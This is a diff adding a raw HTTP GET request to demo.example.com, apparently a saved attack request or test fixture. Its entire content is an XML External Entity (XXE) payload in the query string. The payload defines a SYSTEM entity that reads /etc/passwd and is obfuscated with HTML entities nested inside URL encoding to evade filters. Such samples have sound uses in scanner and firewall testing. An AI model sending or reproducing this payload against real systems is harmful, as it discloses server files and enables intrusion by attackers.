@@ -1,0 +1,4 @@
+GET /a?q=%26%23x3C;%3Fxml%20version%3D%26%23x22;1.0%26%23x22;%3F%26%23x3E;%26%23x3C;!DOCTYPE%20r%20[%26%23x3C;!ENTITY%20x%20SYSTEM%20%26%23x22;file:///etc/passwd%26%23x22;%26%23x3E;]%26%23x3E;%26%23x3C;r%26%23x3E;%26%23x26;x;%26%23x3C;/r%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
